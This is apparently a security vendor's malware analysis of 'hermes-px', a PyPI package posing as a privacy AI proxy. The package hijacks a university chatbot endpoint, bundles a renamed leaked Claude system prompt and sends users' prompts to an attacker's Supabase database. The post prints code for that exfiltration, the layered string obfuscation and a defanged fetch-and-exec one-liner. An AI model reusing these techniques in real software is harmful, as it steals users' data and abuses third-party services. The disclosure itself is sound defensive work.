---
excerpt: "A malicious PyPI package disguised as a Tor-routed AI proxy abuses a Tunisian university's private AI infrastructure, bundles a stolen 246K-character Anthropic Claude system prompt, and silently exfiltrates every user prompt and response to the attacker's Supabase database."
title: "hermes-px: The 'Privacy' AI Proxy That Steals Your Prompts, Containing Altered Claude Code System Prompt"
date: "April 5, 2026"
description: "Guy Korolevski, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/hermes-px-pypi/image1.png
type: realTimePost
minutes: '9'
---
![](/img/RealTimePostImage/post/hermes-px-pypi/image1.png)

The JFrog security research team has discovered a malicious PyPI package called `hermes-px` that layers multiple deceptions on top of each other. Marketed as a "Secure AI Inference Proxy" that routes OpenAI-compatible requests through **Tor** for anonymity, the package actually hijacks a Tunisian university's private AI endpoint, bundles a stolen and **rebranded Anthropic Claude system prompt**, launders all responses to hide the true upstream source, and exfiltrates every user message directly to the attacker's Supabase database, bypassing the very Tor anonymity it promises.

The package requires no API keys. The victim gets "free" AI inference by unknowingly abusing stolen university infrastructure, while every prompt they send is logged by the attacker.

![](/img/RealTimePostImage/post/hermes-px-pypi/image2.png)

## The Bait: A Polished "OpenAI Drop-In Replacement"

Unlike many malicious packages that ship with minimal documentation and obvious red flags, `hermes-px` is unusually well-crafted. The package includes a detailed README with installation instructions, code examples, a migration guide from the OpenAI SDK, error handling documentation, and even a RAG (Retrieval-Augmented Generation) pipeline feature. The code itself is clean, well-structured, and uses proper exception hierarchies and dataclass models.

The package presents itself as the product of a company called "EGen Labs" and exposes an API surface identical to the OpenAI Python SDK:

```python
from hermes import Hermes

with Hermes() as client:
    response = client.chat.completions.create(
        model="OLYMPUS-1",
        messages=[{"role": "user", "content": "Hello!"}]
    )
    print(response.choices[0].message.content)
```

The README also includes an "Interactive Learning CLI" section that instructs users to **fetch and execute a Python script directly from a GitHub** URL using `urllib.request` and `exec()`:

```python
python -c "import urllib.request; exec(urllib.request.urlopen('hxxps[:]//raw[.]githubusercontent[.]com/EGenLabs/hermes/main/demo/hermes_learn[.]py').read())"
```

This pattern of downloading and executing arbitrary code at runtime is a red flag on its own. The URL points to `github[.]com/EGenLabs`, the fake organization, and now returns a 404. When the repository existed, this would have given the attacker a secondary code execution vector, allowing them to serve updated payloads without publishing a new package version.

The way that this package is built lures the developers into integrating the package into real projects, flowing more and more prompts into the attacker's hands.

## Under the Hood: Hijacking a University's AI Service

When a user creates a `Hermes()` client, the constructor configures a `requests.Session` with forged browser headers and routes all traffic through a local Tor SOCKS5 proxy, hiding the abuser's identity from the target network:

```python
self.session = requests.Session()
self.session.headers.update(get_headers())
self.session.proxies = {
    "http": tor_proxy,
    "https": tor_proxy,
}
```

The spoofed headers include `Host`, `Origin`, and `Referer` values that impersonate a legitimate browser session on the university's own chat interface. The target URL decrypts to `hxxps[:]//prod[.]universitecentrale[.]net:9443/api/v1/chat/completions/`, a private API endpoint that was never intended for public access.

The target is not hypothetical. [universitecentrale.net](https://www.universitecentrale.net) is the official domain of Universite Centrale, **the largest private university in Tunisia**, founded in 2001. The domain's IP address is registered through AFRINIC to ATI (Agence Tunisienne Internet), the Tunisian national internet agency. The `chat` subdomain spoofed by the package is a live web application protected by Azure WAF, consistent with a university hosting an AI chatbot service in the cloud. 

Furthermore, the two encrypted system payloads injected into every request (`_P1` and `_P2`) reference "academic specialtys" such as math, programming, and cybersecurity, and instruct the model to "assist the student in choosing a specialty", exactly what a university academic advising chatbot would do. Taken together, the domain ownership, IP geolocation, live Azure-protected chat interface, and chatbot-specific system prompts confirm that `hermes-px` is abusing a real, internal university service.

## The Stolen Brain: A 246K-Character Claude System Prompt

Perhaps the most remarkable component of this package is the file `base_prompt.pz`, which contains a 103Kb compressed payload. When decompressed (via `base64` then `zlib`), it expands to a 246K-character system prompt. The full Claude Code system prompt has been recently leaked and can be seen [here](https://github.com/asgeirtj/system_prompts_leaks/blob/0bc4c25f86ac74fc7d0e6a90d6d973a2047547a4/Anthropic/claude-opus-4.6.md?plain=1). The prompt bundled in `hermes-px` is a genuine copy of this prompt that has been bulk-renamed using find-and-replace: `Claude` becomes `AXIOM-1`, `Anthropic` becomes `EGen Labs`, and model identifiers like `claude-sonnet` become `ax1-core`.

![](/img/RealTimePostImage/post/hermes-px-pypi/image3.png)

The renaming was incomplete, leaving definitive proof of origin. Six references to "Claude" and two references to "Anthropic" survived the replacement:

Residual references that survived the replacement include function names like `recommend_claude_apps`, type definitions such as `"title": "AnthropicFetchParams"`, section headers reading `CLAUDE-SPECIFIC CONSTRAINTS:`, and inline references like `Claude format: "Introduction Getting Started"`.

The prompt also contains Claude-specific internal infrastructure markers that would not exist in a fabricated prompt, such as `<reasoning_effort>85</reasoning_effort>`, `<thinking_mode>interleaved</thinking_mode>`, and sandbox filesystem paths like `/mnt/user-data/uploads` and `/mnt/skills/private`. The product mapping is comprehensive: AXIOM-1 Code for VS Code, AXIOM-1 Code for JetBrains, AXIOM-1 in Excel, and other entries that correspond 1:1 with known Claude product offerings. The prompt's size and feature set suggest it was extracted from a late 2025 or early 2026 Claude deployment, well beyond the publicly leaked Claude Sonnet 4 system prompt from May 2025.

On each API call, the decompressed prompt is injected as a system message alongside two additional encrypted system payloads that contain the university chatbot's own academic advisor instructions:

```python
injected_messages = get_system_schema()

if self._base_system_prompt:
    injected_messages.append(
        {"role": "system", "content": self._base_system_prompt}
    )

injected_messages.extend(messages)
```

The user's messages are appended last, after the injected system prompts, so the upstream model processes the entire fabricated context before responding.

## Response Laundering

Before returning responses to the user, the package sanitizes all text to erase evidence of the true upstream provider. The `_sanitize_payload` function replaces any mention of "OpenAI" with "EGen Labs", "ChatGPT" with "AXIOM-1", and `platform.openai.com` URLs with `egenlabs.com`. If the upstream returns a quota-exceeded error, it is replaced with a generic "model is currently offline" message pointing to a fake documentation URL:

```python
if "exceeded your current quota" in text:
    return ("The model is currently offline. "
            "For more information on this error, read the docs: "
            "hxxps[:]//egenlabs[.]com/docs")

replacements = {
    r"platform\.openai\.com[/\w-]*": "egenlabs.com",
    r"(?i)\bopenai\b": "EGen Labs",
    r"(?i)\bchatgpt\b": "AXIOM-1",
}
```

This laundering ensures the user never realizes their requests are hitting a hijacked university endpoint, maintaining the illusion of a legitimate proprietary AI service.

## The Real Payload: Prompt Exfiltration via Supabase

The most damaging component is the telemetry module. After every inference request, the user's original messages and the full AI response are exfiltrated to the attacker's Supabase database. This is enabled by default (`HERMES_TELEMETRY=1`) and runs in a fire-and-forget daemon thread to avoid adding latency:

```python
def _push_telemetry(model, request_messages, response_content):
    url = get_telemetry_url()
    key = get_telemetry_key()

    headers = {
        "apikey": key,
        "Authorization": f"Bearer {key}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal",
    }

    payload = {
        "model": model,
        "request_messages": request_messages,
        "response_content": response_content,
    }

    requests.post(url, headers=headers, json=payload, ...)
```

The exfiltration URL decrypts to `hxxps[:]//urlvoelpilswwxkiosey[.]supabase[.]co/rest/v1/requests_log`, authenticated with a hardcoded Supabase API key.

This telemetry call uses a bare `requests.post()` rather than the Tor-proxied session. The package routes AI inference through Tor to hide the attacker's abuse of the university, but the exfiltration payload is sent directly over the user's network connection. This means the attacker collects not only every prompt and response, but also the user's real IP address, all while the package explicitly promises Tor-based anonymity. The source code comment is candid about the intent: `Direct request bypasses the Tor session to avoid proxy overhead`.


Furthermore, the call site at `completions.py` deliberately passes the user's original messages (not the injected system prompts), so the attacker receives clean, uncontaminated user prompts without the system prompt noise.

Technically, telemetry can be disabled by setting the environment variable `HERMES_TELEMETRY=0`. The package's README does mention this in a configuration table, describing it as disabling "fire-and-forget Supabase tracking". However, the description is buried among benign configuration knobs like `RAG_DATA_DIR` and `HERMES_LOG_CONSOLE`, with no indication of what data is actually collected, no mention that the telemetry bypasses Tor, and no disclosure that it exposes the user's real IP. It is the classic "technically not hidden" but "practically obscured", opt-out rather than opt-in, with a benign-sounding label that gives no reason to suspect full conversation exfiltration.

## Triple-Layer Obfuscation

All sensitive strings in the package, including the target URL, spoofed headers, system payloads, and Supabase credentials, are protected by a three-layer encryption pipeline: `plaintext -> XOR(rotating key) -> zlib compress -> base64 encode`. The XOR key is a 210-byte rotating key (`_XK`) split across multiple hex string segments to avoid simple pattern matching:

```python
_XK = bytes.fromhex(
    "333e5b7c412736685b3c296a58663a7763744949"
    "4c385d4376314b24793b6b4e3526783f72383667"
    # ... 8 more segments
)

def _decrypt(encrypted: str) -> str:
    compressed = base64.b64decode(encrypted)
    xored = zlib.decompress(compressed)
    raw = bytes(b ^ _XK[i % len(_XK)] for i, b in enumerate(xored))
    return raw.decode("utf-8")
```

No plaintext secrets exist anywhere in the distributed package. All values are decoded exclusively in-memory at runtime, which prevents naive static string scanning from flagging the malicious endpoints.

## Remediation

- Uninstall the package: `pip uninstall hermes-px`
- Rotate any credentials, API keys, or secrets that were included in prompts sent through the package
- Assume all prompts and responses used via the package have been captured by the attacker and review them for sensitive content (passwords, internal URLs, proprietary code, PII)
- Block the exfiltration endpoint `urlvoelpilswwxkiosey[.]supabase[.]co` at the network level
- If Tor was installed specifically for this package, consider removing it to reduce attack surface


## Conclusions

This package stands out for the sophistication of its social engineering rather than its technical complexity. The polished documentation, OpenAI SDK-compatible API surface, and working RAG pipeline make it a convincing trojan. The multi-layered deception is noteworthy: the user thinks they are using a privacy-focused AI proxy, but they are actually abusing a stolen university endpoint, feeding a stolen Claude system prompt, having all provider references scrubbed from responses, and having every prompt exfiltrated via a direct (non-Tor) connection that exposes their real IP.

The inclusion of a stolen, near-complete Anthropic Claude system prompt is concerning. After the recently leaked source was exposed in recent incidents, we see attackers using the proprietary assets, specifically here altered to mimic non-existing models and services.

This package is already detected by **JFrog Xray** and **JFrog Curation**, under the Xray ID listed in the IOC section below.

## IOCs

- `hermes-px` (PyPI) - XRAY-961094
- `hxxps[:]//prod[.]universitecentrale[.]net:9443/api/v1/chat/completions/` - abused university AI API endpoint
- `chat.universitecentrale.net` - spoofed Origin/Referer header value
- `hxxps[:]//urlvoelpilswwxkiosey[.]supabase[.]co/rest/v1/requests_log` - Supabase exfiltration endpoint
- `hxxps[:]//raw[.]githubusercontent[.]com/EGenLabs/hermes/main/demo/hermes_learn[.]py` - execution via README's instructions
- `github[.]com/EGenLabs` - fake GitHub organization (404)
- `egenlabs[.]com` - fake company domain referenced in response sanitization

